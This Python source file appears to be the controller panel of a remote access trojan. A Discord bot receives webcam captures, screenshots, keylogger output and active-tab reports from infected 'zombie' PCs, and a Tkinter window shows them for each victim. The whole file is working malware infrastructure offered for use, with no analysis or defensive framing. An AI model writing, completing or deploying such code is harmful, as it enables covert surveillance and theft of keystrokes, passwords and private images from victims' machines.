from discord.ext import commands
import tkinter as tk
import threading
from urllib.request import Request,urlopen
from PIL import Image,ImageTk
import io
from tkinter import PhotoImage,Tk,Label
global msg,dic
msg = None
dic = {}

def tkinter():
    global msg,dic
    window = tk.Tk()
    window.title("R_handler")
    def loop():
        global dic
        if not list(listbox_1.get(0,tk.END)) == list(dic.keys()):
            listbox_1.insert(listbox_1.size(),list(dic.keys())[len(list(dic.keys()))-1])
        window.after(500,loop)
    def newtab(select):
        global dic
        new_text = len(dic[list(dic.keys())[select]]['text'])-1
        new_log = len(dic[list(dic.keys())[select]]['log'])-1
        new = tk.Toplevel(window)
        new.title(list(dic.keys())[select])
        new.geometry("1380x930+300+150")
        scroll = tk.Scrollbar(new)
        scroll2 = tk.Scrollbar(new)
        scroll.place(x=1350,y=25,height=420)
        scroll2.place(x=1350,y=445,height=420)
        entty1 = tk.Text(new,wrap="word",yscrollcommand=scroll.set)
        entty2 = tk.Text(new, wrap="word", yscrollcommand=scroll2.set)
        entty3 = tk.Text(new,)
        label1 = tk.Label(new,image=dic[list(dic.keys())[select]]['img1'],
                          borderwidth = 2,
                        relief="ridge",
                          )
        label2 = tk.Label(new,image=dic[list(dic.keys())[select]]['img2'],
                          borderwidth = 2,
                        relief="ridge",
                          )
        label3 = tk.Label(new,text="cam",font=16)
        label4= tk.Label(new,text="screen",font=16)
        label5 = tk.Label(new, text="log", font=16)
        label6 = tk.Label(new, text="keylogger", font=16)
        label7 = tk.Label(new, text="nowtab", font=16)
        def loop():
            str1 = ""
            str2 = ""
            wrong = None
            wrong2 = None
            for i in dic[list(dic.keys())[select]]['log'][new_log:]:
                str1 = str1 + i
            for i in dic[list(dic.keys())[select]]['text'][new_text:]:
                str2 = str2 + i
            for i,z in zip(str1.replace("\n","").split("@"),range(0,len(str1.replace("\n","").split("@")))):
                check = False
                for x in entty1.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong = z
            if wrong != None:
                Tm = ""
                for i in str1.replace("\n","").split("@")[wrong:]:
                    Tm = Tm + f"@{i}\n"
                entty1.insert("end",Tm)
            for i,z in zip(str2.replace("\n","").split("@"),range(0,len(str2.replace("\n","").split("@")))):
                check = False
                for x in entty2.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong2 = z
            if wrong2 != None:
                Tm = ""
                for i in str2.replace("\n","").split("@")[wrong2:]:
                    Tm = Tm + f"@{i}\n"
                entty2.insert("end",Tm)
            print(str1.replace("\n","").split("@"))
            print(entty1.get(1.0,"end").replace("\n","").split("@"))
            label1.config(image=dic[list(dic.keys())[select]]['img1'])
            label2.config(image=dic[list(dic.keys())[select]]['img2'])
            entty3.delete(1.0,"end")
            entty3.insert(1.0,dic[list(dic.keys())[select]]['nowtab'])
            new.after(500,loop)
        entty1.place(x=750,y=30,width=600,height=420)
        entty2.place(x=750,y=476,width=600,height=420)
        entty3.place(x=750,y=905,width=600,height=20)
        label1.place(x=10, y=25)
        label2.place(x=10, y=475)
        label3.place(x=325, y=0)
        label4.place(x=325, y=450)
        label5.place(x=1030, y=0)
        label6.place(x=1030, y=450)
        label7.place(x=670, y=905)
        new.after(500,loop)
    def event():
        threading.Thread(target=newtab, args=(listbox_1.curselection()[0],)).start()
    listbox_1 = tk.Listbox(window, selectmode="extend", height=0)
    button_1 = tk.Button(window,text="show zombiePC control",command=event)
    listbox_1.pack()
    button_1.pack()
    window.after(500,loop)
    window.mainloop()
threading.Thread(target=tkinter).start()
bot = commands.Bot(command_prefix="")

@bot.event
async def on_message(message):
    global msg,dic
    msg = message
    check = False
    for k in dic.keys():
        if k == message.author.name:
            check = True
    if not check:
        im = Image.open("image/OIP.jpeg")
        im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(im)
        dic[message.author.name] = {"img1" : image, "img2" : image, "text" : [], "log" : [], "nowtab" : ""}
    if message.attachments == []:
        pass
    else:
        if "@IMAGE1" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            width, height = im.size
            im = im.resize((1920//4 + 250, 1080//4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img1"] = image
        if "@IMAGE2" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img2"] = image
    if "@SUCCESS" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@KEYLOG" in message.content:
        dic[message.author.name]["text"].append(message.content)
    if "@ERROR" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@TABLOG" in message.content:
        dic[message.author.name]["nowtab"] = message.content
bot.run('bot token here')
